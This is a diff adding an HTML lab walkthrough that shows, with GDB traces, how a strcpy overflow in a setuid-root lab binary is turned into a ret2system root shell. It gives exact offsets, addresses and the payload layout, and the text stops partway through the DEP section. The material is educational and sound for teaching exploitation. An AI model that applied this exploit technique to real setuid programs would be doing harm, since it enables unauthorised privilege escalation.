@@ -1,0 +1,1077 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>target5 — Stack Overflow to Root Shell</title>
+<style>
+  :root {
+    --ink: #17202b;
+    --muted: #5c6878;
+    --bg: #f3f6fa;
+    --card: #ffffff;
+    --line: #d8e0ea;
+    --red: #b42318;
+    --red-bg: #fef3f2;
+    --green: #13713d;
+    --green-bg: #ecfdf3;
+    --blue: #1d5fa7;
+    --blue-bg: #eff6ff;
+    --amber: #8a5a00;
+    --amber-bg: #fffaeb;
+    --code-bg: #101823;
+    --code-ink: #dce7f4;
+    --code-muted: #8294a9;
+    --mono: "Cascadia Code", "Consolas", "SFMono-Regular", "Liberation Mono", monospace;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    color: var(--ink);
+    background:
+      radial-gradient(circle at 15% 0%, #e4edff 0, transparent 34rem),
+      var(--bg);
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    line-height: 1.62;
+  }
+  a { color: var(--blue); }
+  code, pre { font-family: var(--mono); }
+  .wrap { width: min(1120px, calc(100% - 32px)); margin: 0 auto; }
+
+  /* ---------- hero ---------- */
+  header.hero {
+    color: #f7fbff;
+    background:
+      radial-gradient(circle at 78% 20%, rgba(54, 133, 255, .30) 0, transparent 24rem),
+      linear-gradient(135deg, #101823 0%, #17263a 58%, #102f28 100%);
+    border-bottom: 1px solid #0a1017;
+    padding: 64px 0 48px;
+  }
+  .eyebrow {
+    color: #79d9a5;
+    text-transform: uppercase;
+    letter-spacing: .18em;
+    font-size: .75rem;
+    font-weight: 700;
+    margin-bottom: 14px;
+  }
+  h1 {
+    max-width: 920px;
+    margin: 0;
+    font-size: clamp(2.1rem, 5vw, 4rem);
+    line-height: 1.04;
+    letter-spacing: -.035em;
+  }
+  .lede {
+    max-width: 790px;
+    color: #b9c8d9;
+    font-size: 1.08rem;
+    margin: 22px 0 28px;
+  }
+  .badges { display: flex; flex-wrap: wrap; gap: 9px; }
+  .badge {
+    display: inline-flex;
+    gap: 7px;
+    align-items: center;
+    padding: 7px 11px;
+    border: 1px solid rgba(255,255,255,.16);
+    border-radius: 999px;
+    background: rgba(255,255,255,.06);
+    color: #e6eef8;
+    font-size: .76rem;
+    font-weight: 700;
+    letter-spacing: .04em;
+  }
+  .badge .dot { width: 7px; height: 7px; border-radius: 50%; background: #79d9a5; }
+  .badge.warn .dot { background: #ffb454; }
+  .badge.bad .dot { background: #ff7b72; }
+
+  /* ---------- layout ---------- */
+  main { padding: 42px 0 80px; }
+  .toc {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 18px 22px;
+    margin-bottom: 38px;
+    box-shadow: 0 8px 24px rgba(22, 34, 51, .05);
+  }
+  .toc strong { display: block; font-size: .77rem; letter-spacing: .12em; text-transform: uppercase; color: var(--muted); margin-bottom: 10px; }
+  .toc ol { margin: 0; padding-left: 20px; columns: 2; column-gap: 38px; }
+  .toc li { margin: 5px 0; break-inside: avoid; }
+
+  section { margin: 52px 0; scroll-margin-top: 20px; }
+  h2 {
+    font-size: clamp(1.5rem, 3vw, 2.1rem);
+    line-height: 1.16;
+    letter-spacing: -.025em;
+    margin: 0 0 8px;
+  }
+  h2 .num {
+    display: inline-grid;
+    place-items: center;
+    vertical-align: 4px;
+    width: 34px;
+    height: 34px;
+    margin-right: 8px;
+    border-radius: 10px;
+    background: #18283b;
+    color: #fff;
+    font-size: .95rem;
+    letter-spacing: 0;
+  }
+  h3 { font-size: 1.12rem; margin: 28px 0 8px; }
+  p { margin: 10px 0; }
+  .section-intro { color: var(--muted); max-width: 850px; margin-bottom: 20px; }
+
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 22px;
+    box-shadow: 0 8px 24px rgba(22, 34, 51, .045);
+  }
+  .grid { display: grid; gap: 16px; }
+  .grid.two { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  .grid.three { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+  .stat { padding: 18px 20px; }
+  .stat .label { color: var(--muted); font-size: .72rem; text-transform: uppercase; letter-spacing: .11em; font-weight: 800; }
+  .stat .value { font-family: var(--mono); font-size: 1.12rem; font-weight: 700; margin-top: 6px; word-break: break-word; }
+  .stat .hint { color: var(--muted); font-size: .85rem; margin-top: 3px; }
+
+  .callout {
+    border-radius: 14px;
+    padding: 16px 18px;
+    margin: 18px 0;
+    border: 1px solid;
+  }
+  .callout strong:first-child { display: block; margin-bottom: 3px; }
+  .callout.danger { background: var(--red-bg); border-color: #f5c7c2; color: #68130d; }
+  .callout.success { background: var(--green-bg); border-color: #b7ebc9; color: #0b5130; }
+  .callout.info { background: var(--blue-bg); border-color: #c7ddf8; color: #123f72; }
+  .callout.warn { background: var(--amber-bg); border-color: #f2d28a; color: #664000; }
+
+  .pill {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 999px;
+    font-size: .74rem;
+    font-weight: 800;
+    letter-spacing: .03em;
+    background: #e8edf5;
+    color: #344257;
+    white-space: nowrap;
+  }
+  .pill.red { background: var(--red-bg); color: var(--red); }
+  .pill.green { background: var(--green-bg); color: var(--green); }
+  .pill.blue { background: var(--blue-bg); color: var(--blue); }
+  .pill.amber { background: var(--amber-bg); color: var(--amber); }
+
+  /* ---------- code ---------- */
+  pre {
+    margin: 16px 0;
+    padding: 18px 20px;
+    border-radius: 14px;
+    background: var(--code-bg);
+    color: var(--code-ink);
+    font-size: .82rem;
+    line-height: 1.55;
+    overflow-x: auto;
+    border: 1px solid #263649;
+    box-shadow: inset 0 1px 0 rgba(255,255,255,.04);
+  }
+  pre .c { color: var(--code-muted); }       /* comment */
+  pre .g { color: #75d79b; }                 /* green highlight */
+  pre .r { color: #ff8c83; }                 /* red highlight */
+  pre .y { color: #ffd166; }                 /* yellow highlight */
+  pre .b { color: #8ec5ff; }                 /* blue highlight */
+  pre .hl { background: rgba(255, 196, 0, .13); display: inline-block; min-width: 100%; }
+
+  .file-label {
+    display: inline-block;
+    margin: 18px 0 -8px;
+    padding: 5px 10px;
+    border-radius: 8px 8px 0 0;
+    background: #1b2a3d;
+    color: #b9cbe0;
+    font-family: var(--mono);
+    font-size: .72rem;
+    border: 1px solid #2b3d53;
+    border-bottom: 0;
+  }
+  .file-label + pre { margin-top: 0; border-top-left-radius: 0; }
+
+  /* ---------- stack diagram ---------- */
+  .stack {
+    margin: 20px 0;
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    overflow: hidden;
+    background: #fff;
+    font-family: var(--mono);
+  }
+  .stack-row {
+    display: grid;
+    grid-template-columns: 112px 116px minmax(0, 1fr);
+    gap: 14px;
+    padding: 11px 15px;
+    border-top: 1px solid #e8edf4;
+    align-items: center;
+    font-size: .82rem;
+  }
+  .stack-row:first-child { border-top: 0; }
+  .stack-row .addr { color: #5d6d82; }
+  .stack-row .val { color: #19293c; font-weight: 700; }
+  .stack-row .what { color: #4e5d70; }
+  .stack-row.eip { background: #fff1f0; box-shadow: inset 4px 0 0 #d92d20; }
+  .stack-row.eip .val { color: #a51c12; }
+  .stack-row.buf { background: #eef6ff; box-shadow: inset 4px 0 0 #2e77d0; }
+  .stack-row.buf .val { color: #124f9c; }
+  .stack-row.arg { background: #ecfdf3; box-shadow: inset 4px 0 0 #16a34a; }
+  .stack-row.arg .val { color: #0c6b37; }
+  .stack-row.ebx { background: #fbfcfe; }
+  .arrow-note {
+    text-align: center;
+    font-family: var(--mono);
+    color: #637083;
+    font-size: .78rem;
+    padding: 7px;
+    border-top: 1px dashed #d8e0ea;
+    background: #fafcff;
+  }
+
+  /* ---------- table ---------- */
+  .table-wrap { overflow-x: auto; margin: 16px 0; border: 1px solid var(--line); border-radius: 14px; background: #fff; }
+  table { width: 100%; border-collapse: collapse; font-size: .86rem; }
+  th, td { text-align: left; padding: 11px 14px; border-bottom: 1px solid #e9eef5; vertical-align: top; }
+  th { background: #f7f9fc; color: #455367; font-size: .72rem; text-transform: uppercase; letter-spacing: .08em; }
+  tr:last-child td { border-bottom: 0; }
+  td.mono, th.mono { font-family: var(--mono); }
+  .good { color: var(--green); font-weight: 700; }
+  .bad { color: var(--red); font-weight: 700; }
+  .warn { color: var(--amber); font-weight: 700; }
+
+  ul, ol { padding-left: 24px; }
+  li { margin: 6px 0; }
+  .checklist { list-style: none; padding-left: 0; }
+  .checklist li { position: relative; padding-left: 30px; margin: 10px 0; }
+  .checklist li::before {
+    content: "✓";
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 21px;
+    height: 21px;
+    border-radius: 50%;
+    display: grid;
+    place-items: center;
+    background: var(--green-bg);
+    color: var(--green);
+    font-weight: 900;
+    font-size: .75rem;
+  }
+  .checklist.fix li::before { content: "→"; background: var(--blue-bg); color: var(--blue); }
+
+  details {
+    margin: 16px 0;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    background: #fff;
+    overflow: hidden;
+  }
+  summary {
+    cursor: pointer;
+    padding: 12px 16px;
+    font-weight: 700;
+    color: #2f4058;
+    background: #f8fafc;
+  }
+  details pre { margin: 0; border: 0; border-radius: 0; max-height: 520px; }
+  .small { font-size: .84rem; color: var(--muted); }
+  footer { border-top: 1px solid var(--line); padding: 26px 0 0; color: var(--muted); font-size: .84rem; }
+
+  @media (max-width: 820px) {
+    .grid.two, .grid.three { grid-template-columns: 1fr; }
+    .toc ol { columns: 1; }
+    .stack-row { grid-template-columns: 1fr; gap: 2px; }
+    .stack-row .addr { font-size: .72rem; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="eyebrow">Security lab walkthrough · GDB evidence included</div>
+    <h1>target5: overflowing the stack into a root shell</h1>
+    <p class="lede">
+      This page follows the exact stack from a normal call, through the <code>strcpy()</code>
+      overflow, up to the <code>ret</code> that redirects execution into <code>system("/bin/sh")</code>.
+      All stack addresses and traces below were collected with GDB inside the lab VM.
+    </p>
+    <div class="badges">
+      <span class="badge"><span class="dot"></span>DEP / NX enabled</span>
+      <span class="badge"><span class="dot"></span>32-bit static ELF</span>
+      <span class="badge warn"><span class="dot"></span>No PIE</span>
+      <span class="badge warn"><span class="dot"></span>ASLR off in VM</span>
+      <span class="badge bad"><span class="dot"></span>Unbounded strcpy</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <nav class="toc" aria-label="Table of contents">
+    <strong>Walkthrough contents</strong>
+    <ol>
+      <li><a href="#summary">At a glance</a></li>
+      <li><a href="#source">The vulnerable source</a></li>
+      <li><a href="#security">Security properties</a></li>
+      <li><a href="#frame">The vulnerable stack frame</a></li>
+      <li><a href="#normal">Normal execution</a></li>
+      <li><a href="#overflow">The overflow</a></li>
+      <li><a href="#ret">leave; ret → system()</a></li>
+      <li><a href="#dep">Why DEP does not stop it</a></li>
+      <li><a href="#bad20">Why 20 bytes segfaulted</a></li>
+      <li><a href="#solution">Final payload and root shell</a></li>
+      <li><a href="#checklist">Exploitability checklist</a></li>
+      <li><a href="#reproduce">Appendix: reproduce in GDB</a></li>
+    </ol>
+  </nav>
+
+  <!-- ============================================================ -->
+  <section id="summary">
+    <h2><span class="num">0</span>At a glance</h2>
+    <p class="section-intro">
+      The bug is a classic stack buffer overflow. DEP stops injected shellcode from running,
+      so the exploit reuses code that is already executable: the static binary's own
+      <code>system()</code> function. This is return-to-libc / ret2system.
+    </p>
+
+    <div class="grid three">
+      <div class="card stat">
+        <div class="label">Bug</div>
+        <div class="value">strcpy()</div>
+        <div class="hint">writes into <code>char buf[10]</code> with no length limit</div>
+      </div>
+      <div class="card stat">
+        <div class="label">Overwrite distance</div>
+        <div class="value">22 bytes</div>
+        <div class="hint">buf starts at <code>ebp-0x12</code>; saved EIP is at <code>ebp+4</code></div>
+      </div>
+      <div class="card stat">
+        <div class="label">Control target</div>
+        <div class="value">0x08051520</div>
+        <div class="hint">address of <code>system()</code> in the non-PIE binary</div>
+      </div>
+      <div class="card stat">
+        <div class="label">Argument</div>
+        <div class="value">0x080b884d</div>
+        <div class="hint">address of the string <code>"/bin/sh"</code></div>
+      </div>
+      <div class="card stat">
+        <div class="label">Privilege</div>
+        <div class="value">root</div>
+        <div class="hint">setuid-root binary and <code>setuid(0)</code> runs before <code>vulnerable()</code></div>
+      </div>
+      <div class="card stat">
+        <div class="label">Result</div>
+        <div class="value">/bin/sh</div>
+        <div class="hint">a root shell; the later SIGSEGV is harmless and allowed</div>
+      </div>
+    </div>
+
+    <div class="callout success">
+      <strong>The exploit in one sentence</strong>
+      Send 22 filler bytes, then overwrite the saved return address with <code>system()</code>,
+      then place a fake return address and a pointer to <code>"/bin/sh"</code> directly after it.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="source">
+    <h2><span class="num">1</span>The vulnerable source</h2>
+    <p class="section-intro">
+      The overflow happens in <code>vulnerable()</code> on the <code>strcpy()</code> line.
+      The program calls <code>setuid(0)</code> before reaching that line, so the overflowing
+      copy already runs with root privileges.
+    </p>
+
+    <div class="file-label">target5.c</div>
+    <pre><span class="c">// Compiled with DEP enabled.</span>
+<span class="c">// It's OK if your program crashes after the user exits the shell.</span>
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+void greetings(void)
+{
+    system("echo Hello World");
+}
+
+void vulnerable(char *arg)
+{
+    char buf[10];                 <span class="c">// only 10 bytes are reserved logically</span>
+<span class="hl">    strcpy(buf, arg);             <span class="c">// BUG: copies until NUL, no bounds check</span></span>
+}
+
+int _main(int argc, char *argv[])
+{
+    if (argc != 2) {
+        fprintf(stderr, "Error: Need a command-line argument\n");
+        return 1;
+    }
+    setuid(0);                    <span class="c">// <-- gain root BEFORE the overflow</span>
+    vulnerable(argv[1]);          <span class="c">// <-- attacker-controlled argument</span>
+    greetings();
+    return 0;
+}</pre>
+
+    <div class="callout danger">
+      <strong>Exploitable issue #1 — unbounded copy into a fixed-size stack buffer</strong>
+      <code>strcpy()</code> does not know the size of <code>buf</code>. Every byte after the first 10
+      keeps writing into whatever is next on the stack: compiler padding, the saved
+      <code>ebp</code>, and finally the saved return address.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="security">
+    <h2><span class="num">2</span>Security properties of target5</h2>
+    <p class="section-intro">
+      These properties determine which exploitation technique works. DEP/NX blocks new code on
+      the stack, but it does not block reusing existing executable code.
+    </p>
+
+    <div class="file-label">readelf / nm / /proc output from the VM</div>
+    <pre><span class="c"># ELF type: non-PIE executable, 32-bit Intel</span>
+Class:                             ELF32
+Type:                              <span class="y">EXEC (Executable file)</span>
+Machine:                           Intel 80386
+
+<span class="c"># GNU_STACK has RW, not RWE. The stack is not executable (DEP / NX).</span>
+LOAD           0x001000 0x08049000 0x08049000 0x6e104 0x6e104 <span class="g">R E</span> 0x1000
+LOAD           0x070000 0x080b8000 0x080b8000 0x2f7ed 0x2f7ed <span class="b">R  </span> 0x1000
+<span class="r">GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span>
+
+<span class="c"># Fixed addresses because this is a statically linked non-PIE binary</span>
+0804a035 T greetings
+0804a060 T vulnerable
+0804a08b T _main
+<span class="g">08051520 W system</span>
+
+<span class="c"># ASLR is disabled globally in the lab VM</span>
+/proc/sys/kernel/randomize_va_space = <span class="y">0</span></pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Protection</th><th>State</th><th>What it means here</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>DEP / NX</strong></td>
+            <td><span class="pill green">ON</span></td>
+            <td>The stack is <code>rw-p</code>, not executable. Injected shellcode on the stack would fault.</td>
+          </tr>
+          <tr>
+            <td><strong>ASLR</strong></td>
+            <td><span class="pill amber">OFF in VM</span></td>
+            <td><code>randomize_va_space = 0</code>. The stack addresses shown are stable in this VM.</td>
+          </tr>
+          <tr>
+            <td><strong>PIE</strong></td>
+            <td><span class="pill red">OFF</span></td>
+            <td><code>Type: EXEC</code>. Code and data addresses are fixed: <code>system</code> and <code>"/bin/sh"</code> never move.</td>
+          </tr>
+          <tr>
+            <td><strong>Stack canary</strong></td>
+            <td><span class="pill red">ABSENT</span></td>
+            <td><code>vulnerable()</code> has no <code>fs:0x14</code> load/check before <code>ret</code>.</td>
+          </tr>
+          <tr>
+            <td><strong>Static linking</strong></td>
+            <td><span class="pill blue">YES</span></td>
+            <td><code>system()</code> and <code>"/bin/sh"</code> are inside target5 itself, at fixed addresses.</td>
+          </tr>
+          <tr>
+            <td><strong>Setuid root</strong></td>
+            <td><span class="pill red">YES</span></td>
+            <td>Mode <code>6777</code>, owner root. <code>setuid(0)</code> succeeds before the overflow.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>Environment note</strong>
+      The payload does <em>not</em> contain a stack address. It only uses fixed addresses inside the
+      non-PIE executable, so it does not depend on stack layout or manually exported environment
+      variables. The stack addresses in the diagrams are evidence from this VM, not values used by
+      the exploit.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="frame">
+    <h2><span class="num">3</span>The vulnerable stack frame</h2>
+    <p class="section-intro">
+      GDB and <code>objdump</code> show exactly where the compiler placed <code>buf</code>.
+      The key instruction is <code>lea edx,[ebp-0x12]</code>: the buffer starts 18 bytes below
+      the saved frame pointer.
+    </p>
+
+    <div class="file-label">objdump -d -Mintel target5 --disassemble=vulnerable</div>
+    <pre>0804a060 &lt;vulnerable&gt;:
+ 804a060: 55                    push   ebp
+ 804a061: 89 e5                 mov    ebp,esp
+ 804a063: 53                    push   ebx
+ 804a064: 83 ec 14              sub    esp,0x14
+ ...
+ 804a071: 83 ec 08              sub    esp,0x8
+ 804a074: ff 75 08              push   DWORD PTR [ebp+0x8]   <span class="c">; arg</span>
+<span class="hl"> 804a077: 8d 55 ee              lea    edx,[ebp-0x12]         <span class="c">; &amp;buf — NOT ebp-0x0a!</span></span>
+ 804a07a: 52                    push   edx                    <span class="c">; destination</span>
+ 804a07b: 89 c3                 mov    ebx,eax
+ 804a07d: e8 9e ef ff ff        call   &lt;strcpy&gt;
+ 804a082: 83 c4 10              add    esp,0x10
+ ...
+ 804a086: 8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
+ 804a089: c9                    leave                        <span class="c">; mov esp,ebp; pop ebp</span>
+ 804a08a: c3                    ret                          <span class="c">; pop saved EIP</span></pre>
+
+    <div class="grid three">
+      <div class="card stat">
+        <div class="label">buf address</div>
+        <div class="value">ebp - 0x12</div>
+        <div class="hint">18 bytes below saved EBP</div>
+      </div>
+      <div class="card stat">
+        <div class="label">saved EBP</div>
+        <div class="value">[ebp]</div>
+        <div class="hint">4 bytes</div>
+      </div>
+      <div class="card stat">
+        <div class="label">saved EIP</div>
+        <div class="value">[ebp + 4]</div>
+        <div class="hint">the return address to overwrite</div>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>Exploitable issue #2 — the saved return address is only 22 bytes away</strong>
+      Distance = <code>0x12</code> bytes from <code>buf</code> to <code>ebp</code>, plus 4 bytes
+      for the saved <code>ebp</code> itself: <code>0x12 + 4 = 22</code>.
+      The 10-byte declaration is misleading; the compiler reserved 18 bytes before <code>ebp</code>.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="normal">
+    <h2><span class="num">4</span>Normal execution: no overflow</h2>
+    <p class="section-intro">
+      Running the binary under GDB with the short argument <code>"AAAA"</code> shows the healthy
+      frame. The saved return address still points back into <code>_main</code>.
+    </p>
+
+    <div class="stack" aria-label="Normal stack frame">
+      <div class="stack-row eip">
+        <span class="addr">0xfff6ba4c</span>
+        <span class="val">0x0804a0e7</span>
+        <span class="what"><strong>saved EIP</strong> → return to <code>_main+92</code>, right after <code>call vulnerable</code></span>
+      </div>
+      <div class="stack-row">
+        <span class="addr">0xfff6ba48</span>
+        <span class="val">0xfff6ba68</span>
+        <span class="what"><strong>saved EBP</strong> of <code>vulnerable()</code> (<code>[ebp]</code>)</span>
+      </div>
+      <div class="stack-row ebx">
+        <span class="addr">0xfff6ba44</span>
+        <span class="val">0x080eb000</span>
+        <span class="what">saved EBX / compiler frame data</span>
+      </div>
+      <div class="stack-row buf">
+        <span class="addr">0xfff6ba36</span>
+        <span class="val">buf[0]</span>
+        <span class="what">start of <code>buf</code> at <code>ebp-0x12</code>. Only bytes <code>buf[0..9]</code> are the declared array; the compiler reserved 18 bytes total up to <code>ebp</code>.</span>
+      </div>
+      <div class="arrow-note">lower addresses ↑ · stack grows downward · 22 bytes from buf[0] to saved EIP</div>
+    </div>
+
+    <div class="file-label">GDB — key lines from the normal run</div>
+    <pre>[1] Inside vulnerable(), after prologue, BEFORE strcpy
+    ebp                         = 0xfff6ba48
+    buf (ebp-0x12)              = 0xfff6ba36
+    saved return slot (ebp+4)   = 0xfff6ba4c
+    saved return value NOW      = <span class="g">0x804a0e7</span>  <span class="c">&lt;-- points back into _main</span>
+    distance buf -&gt; saved EIP   = 0x12 + 4 = <span class="y">22 bytes</span>
+
+[2] AFTER strcpy() returns, BEFORE leave/ret
+    The short string only fills the first bytes of buf.
+    Saved return value is still intact:
+    *(ebp+4) = <span class="g">0x804a0e7</span>
+
+[3] At the vulnerable() ret instruction
+    ESP points at the saved return slot: 0xfff6ba4c
+    value that ret is about to pop = <span class="g">0x804a0e7</span>
+   0x804a0e7 &lt;_main+92&gt;:  add esp,0x10</pre>
+
+    <p class="small">
+      Full trace: <a href="gdb_normal.txt">gdb_normal.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="overflow">
+    <h2><span class="num">5</span>The overflow: overwriting the return address</h2>
+    <p class="section-intro">
+      The attack string is not text — it is a binary layout. The first 22 bytes are filler.
+      The next 12 bytes are three 32-bit little-endian values that land exactly on
+      the saved return address and the two words after it.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th class="mono">offset from buf</th>
+            <th class="mono">bytes (hex)</th>
+            <th class="mono">value</th>
+            <th>purpose</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="mono">0 – 21</td>
+            <td class="mono">41 41 … 41</td>
+            <td class="mono">'A' × 22</td>
+            <td>filler from <code>buf[0]</code> through the saved EBP and padding, ending exactly before saved EIP</td>
+          </tr>
+          <tr>
+            <td class="mono">22 – 25</td>
+            <td class="mono">20 15 05 08</td>
+            <td class="mono"><strong>0x08051520</strong></td>
+            <td><span class="pill red">new EIP</span> address of <code>system()</code></td>
+          </tr>
+          <tr>
+            <td class="mono">26 – 29</td>
+            <td class="mono">ef be ad de</td>
+            <td class="mono">0xdeadbeef</td>
+            <td>fake return address that <code>system()</code> will pop after the shell exits</td>
+          </tr>
+          <tr>
+            <td class="mono">30 – 33</td>
+            <td class="mono">4d 88 0b 08</td>
+            <td class="mono"><strong>0x080b884d</strong></td>
+            <td><span class="pill green">argument</span> pointer to the string <code>"/bin/sh"</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="stack" aria-label="Overflowed stack frame">
+      <div class="stack-row arg">
+        <span class="addr">0xfff6ba54</span>
+        <span class="val">0x080b884d</span>
+        <span class="what"><strong>system argument</strong> → <code>"/bin/sh"</code></span>
+      </div>
+      <div class="stack-row">
+        <span class="addr">0xfff6ba50</span>
+        <span class="val">0xdeadbeef</span>
+        <span class="what"><strong>fake return address</strong> for <code>system()</code></span>
+      </div>
+      <div class="stack-row eip">
+        <span class="addr">0xfff6ba4c</span>
+        <span class="val">0x08051520</span>
+        <span class="what"><strong>saved EIP overwritten</strong> → <code>system()</code></span>
+      </div>
+      <div class="stack-row">
+        <span class="addr">0xfff6ba48</span>
+        <span class="val">0x41414141</span>
+        <span class="what">saved EBP clobbered with <code>"AAAA"</code> — harmless for this exploit</span>
+      </div>
+      <div class="stack-row buf">
+        <span class="addr">0xfff6ba36</span>
+        <span class="val">0x41414141 …</span>
+        <span class="what">22 bytes of <code>'A'</code> begin here</span>
+      </div>
+      <div class="arrow-note">the overwrite is aligned so the three injected words start at 0xfff6ba4c</div>
+    </div>
+
+    <div class="file-label">GDB — after strcpy() with the exploit payload</div>
+    <pre>[2] AFTER strcpy() returns: the overflow has happened
+    buf now contains 22 'A' bytes, then the injected addresses.
+    saved return slot (ebp+4) = 0xfff6ba4c
+    saved return value NOW    = <span class="r">0x8051520</span>  <span class="c">&lt;-- overwritten with system()</span>
+
+    Raw bytes of buf and the overwritten return area:
+0xfff6ba36: 41 41 41 41 41 41 41 41
+0xfff6ba3e: 41 41 41 41 41 41 41 41
+0xfff6ba46: 41 41 41 41 41 41 <span class="g">20 15</span>
+0xfff6ba4e: <span class="g">05 08</span> <span class="y">ef be ad de</span> <span class="b">4d 88</span>
+0xfff6ba56: <span class="b">0b 08</span> 00 00 00 00 97 a0
+
+    Stack words:
+0xfff6ba34: 0x41410000 0x41414141 0x41414141 0x41414141
+0xfff6ba44: 0x41414141 0x41414141 <span class="g">0x08051520</span> <span class="y">0xdeadbeef</span>
+0xfff6ba54: <span class="b">0x080b884d</span> 0x00000000 0x0804a097 0x00000000
+    Compare: system() = 0x08051520, /bin/sh = 0x080b884d</pre>
+
+    <div class="callout danger">
+      <strong>Exploitable issue #3 — the return address is attacker-controlled data</strong>
+      Once the write reaches offset 22, the attacker decides what <code>ret</code> will pop.
+      There is no canary value to detect the corruption before the function returns.
+    </div>
+
+    <p class="small">
+      Full trace: <a href="gdb_exploit.txt">gdb_exploit.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="ret">
+    <h2><span class="num">6</span><code>leave; ret</code> → <code>system("/bin/sh")</code></h2>
+    <p class="section-intro">
+      The function epilogue turns the corrupted stack into a function call. On 32-bit x86,
+      the cdecl calling convention puts the return address at <code>[esp]</code> and the first
+      argument at <code>[esp+4]</code>. That is exactly what the exploit arranges.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">What <code>leave</code> does</h3>
+        <pre style="margin-bottom:0">mov esp, ebp   <span class="c">; discard locals</span>
+pop ebp        <span class="c">; restore caller's ebp</span></pre>
+        <p class="small" style="margin-bottom:0">
+          After <code>leave</code>, <code>esp</code> points at the saved return slot
+          <code>0xfff6ba4c</code>.
+        </p>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">What <code>ret</code> does</h3>
+        <pre style="margin-bottom:0">pop eip        <span class="c">; eip = 0x08051520 (system)</span>
+               <span class="c">; esp = 0xfff6ba50</span></pre>
+        <p class="small" style="margin-bottom:0">
+          Control jumps to <code>system()</code>. The next stack word becomes the fake return
+          address, and the word after that is the argument.
+        </p>
+      </div>
+    </div>
+
+    <div class="file-label">GDB — at the ret instruction and at system() entry</div>
+    <pre>[3] At vulnerable()'s ret instruction
+    leave has restored ESP to the saved return slot.
+    ESP = 0xfff6ba4c
+    [esp+0] = <span class="r">0x8051520</span>  <span class="c">&lt;-- ret will jump here (system)</span>
+    [esp+4] = <span class="y">0xdeadbeef</span> <span class="c">&lt;-- fake return address for system</span>
+    [esp+8] = <span class="g">0x80b884d</span>  <span class="c">&lt;-- system's argument (/bin/sh)</span>
+0xfff6ba4c: 0x08051520 0xdeadbeef 0x080b884d 0x00000000
+   0x8051520 &lt;system&gt;: call 0x8051557 &lt;__x86.get_pc_thunk.dx&gt;
+
+[4] system() entry
+    Because this is a normal cdecl call, system reads its argument
+    from [esp+4]. The fake return address is at [esp].
+    ESP = 0xfff6ba50
+    [esp+0] fake return = 0xdeadbeef
+    [esp+4] argument    = 0x80b884d
+    argument string: 0x80b884d: "/bin/sh"
+    Stack words at system entry:
+0xfff6ba50: 0xdeadbeef 0x080b884d 0x00000000 0x0804a097</pre>
+
+    <div class="callout success">
+      <strong>Why the fake return address is necessary</strong>
+      A normal <code>call</code> pushes a return address before entering a function. The exploit
+      uses a plain <code>ret</code> instead, so it must supply that missing word manually.
+      Here it is <code>0xdeadbeef</code>. When <code>/bin/sh</code> exits, <code>system()</code>
+      returns to <code>0xdeadbeef</code> and the process segfaults — which is allowed by the
+      assignment.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="dep">
+    <h2><span class="num">7</span>Why DEP/NX does not stop this exploit</h2>
+    <p class="section-intro">
+      DEP (Data Execution Prevention), also called NX on Linux, marks writable data such as the
+      stack as non-executable. It stops <em>new shellcode placed on the stack</em> from running.
+      It does not stop a return address from pointing at code that is already executable.
+    </p>
+
+    <div class="file-label">/proc/&lt;pid&gt;/maps while stopped inside vulnerable()</div>
+    <pre>08048000-08049000 r--p  <span class="c">/tmp/target5_dbg</span>   <span class="c"># ELF headers / read-only data</span>
+<span class="g">08049000-080b8000 r-xp  /tmp/target5_dbg</span>   <span class="c"># executable code: contains system()</span>
+<span class="b">080b8000-080e8000 r--p  /tmp/target5_dbg</span>   <span class="c"># read-only data: contains "/bin/sh"</span>
+080e9000-080eb000 r--p  /tmp/target5_dbg
+080eb000-080ed000 rw-p  /tmp/target5_dbg   <span class="c"># writable data</span>
+080ed000-08110000 rw-p  [heap]
+<span class="r">fff6b000-ffffe000 rw-p  [stack]</span>        <span class="c"># writable, NOT executable</span></pre>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">Blocked by DEP</h3>
+        <pre style="margin-bottom:0"><span class="c"># classic shellcode attempt</span>
+[stack: rw-p]  inject bytes: 31 c0 ...
+ret -&gt; <span class="r">0xfff6ba36</span>
+       <span class="r">CPU: instruction fetch from NX page</span>
+       <span class="r">-&gt; SIGSEGV</span></pre>
